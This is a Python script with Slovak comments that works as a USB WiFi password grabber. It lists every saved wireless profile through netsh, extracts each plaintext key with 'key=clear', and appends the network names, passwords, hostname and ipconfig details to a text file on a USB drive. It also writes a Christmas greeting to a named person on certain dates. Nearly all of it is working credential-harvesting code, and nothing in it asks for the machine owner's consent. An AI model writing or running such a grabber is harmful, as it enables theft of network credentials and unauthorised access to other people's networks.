import subprocess
import os
import datetime
import platform
import socket

# nazovPC
nazovPC = socket.gethostname()

#UPRAV PISMENO USBCKA
usb_drive = "E:"
#UPRAV PISMENO USBCKA

folder_path = os.path.join(usb_drive, "WiFiHesla")

# Vytvorenie priečinka, ak neexistuje
if not os.path.exists(folder_path):
    os.makedirs(folder_path)

# Dnešný dátum a čas
datum = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
    
# Získanie informácií o WiFi sieťach
try:
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
except subprocess.CalledProcessError:
    print("Nemožno získať informácie o WiFi sieťach. Pravdepodobne nie ste pripojení k žiadnej WiFi sieti.")
    meta_data = b''

# Dekódovanie informácií o WiFi sieťach
data = meta_data.decode('utf-8', errors="backslashreplace")

# Rozdelenie údajov po riadkoch
data = data.split('\n')

# Vytvorenie zoznamu profilov
profiles = []


VianocnyList = ["2023-12-20",
                "2023-12-21",
                "2023-12-22",
                "2023-12-23",
                "2023-12-24",
                
                "2024-12-20",
                "2024-12-21",
                "2025-12-22",
                "2026-12-23",
                "2027-12-24",
                
                "2025-12-20",
                "2025-12-21",
                "2025-12-22",
                "2025-12-23",
                "2025-12-24",
                
                "2026-12-20",
                "2026-12-21",
                "2026-12-22",
                "2026-12-23",
                "2026-12-24"]


# Prechádzanie údajov
for i in data:
    if "All User Profile" in i:
        i = i.split(":")
        i = i[1][1:-1]
        profiles.append(i)

# Cesta k súboru na USB kľúči
file_path = os.path.join(folder_path, "WiFiHesla.txt")

# Zápis dát do súboru
with open(file_path, 'a') as file:
    # Získanie aktuálneho dátumu a času
    VianocnyCas = datetime.datetime.now().strftime("%Y-%m-%d")
    
    # Skontroluj, či aktuálny dátum je v zozname
    if VianocnyCas in VianocnyList:
        file.write(" "*10 + "+ " + "-"*30 + " +" + "\n")
        file.write(" "*10 + ": :  Vesele vianoce Dominik xD  : :\n")
        file.write(" "*10 + "+ " + "-"*30 + " +" + "\n\n\n")
    else:
        file.write("----------------------------------------------------------------------------\n")
        file.write(f"Datum = {VianocnyCas}\n")
    
    file.write(f"----------------------------------------------------------------------------\n")
    file.write(f"Datum = {datum}\n")
    file.write(f"Nazov pocitaca : " + nazovPC + "\n")        
    # Formátovaný zápis údajov
    file.write("----------------------------------------------------------------------------\n")
    file.write("{:<30}| {:<}\n".format(" "*10 + "WiFi Názov", " "*10 + "Heslo"))
    file.write("----------------------------------------------------------------------------\n")

    # Prechádzanie profilov
    for i, wifi_name in enumerate(profiles):
        try:
            # Získanie informácií o WiFi profile s heslom pomocou názvu siete
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi_name, 'key=clear'])

            # Dekódovanie a rozdelenie informácií po riadkoch
            results = results.decode('utf-8', errors="backslashreplace")
            results = results.split('\n')

            # Nájdenie hesla zo zoznamu výsledkov
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

            # Ak existuje heslo, zapíšeme ho do súboru
            try:
                file.write("{:<30}| {:<}\n".format(wifi_name, results[0]))
            except IndexError:
                file.write("{:<30}| {:<}\n".format(wifi_name, ""))

            # Oddelenie po poslednej WiFi sieti a hesle
            if i == len(profiles) - 1:
                file.write("----------------------------------------------------------------------------\n\n")

        except subprocess.CalledProcessError:
            file.write("Encoding Error Occurred\n")

# Získanie informácií o pripojení LAN kábla
try:
    lan_info = subprocess.check_output(['ipconfig', '/all'])
    lan_info = lan_info.decode('utf-8', errors="backslashreplace")
except subprocess.CalledProcessError:
    lan_info = ""

# Zápis informácií o pripojení LAN kábla do súboru
if "Wireless LAN adapter" in lan_info:
    with open(file_path, 'a') as file:
        file.write("Nepripojený LAN Kábel ale pripojený WiFi Adaptér.\n")
        file.write("----------------------------------------------------------------------------\n\n")
else:
    with open(file_path, 'a') as file:
        if "Ethernet adapter" in lan_info:
            file.write("----------------------------------------------------------------------------\n\n")
            file.write(" "*7 + "!! Detekovaný pripojený LAN Kábel.  !!\n")
            file.write(" "*7 + "!! Nemožno uložit WiFi SSID a Heslá !!\n")
            file.write("!! Script Funguje IBA KEĎ JE DOSTUPNÝ WiFi Adaptér !!\n")
            file.write("----------------------------------------------------------------------------\n\n")
        else:
            file.write("LAN Kábel NENI pripojený alebo asi ani WiFi Adaptér\n (alebo nie sú ulozené WiFi SSID a Heslá.)\nAlebo JE WiFi Adaptér pripojený ale DEAKTOVOVANY !")
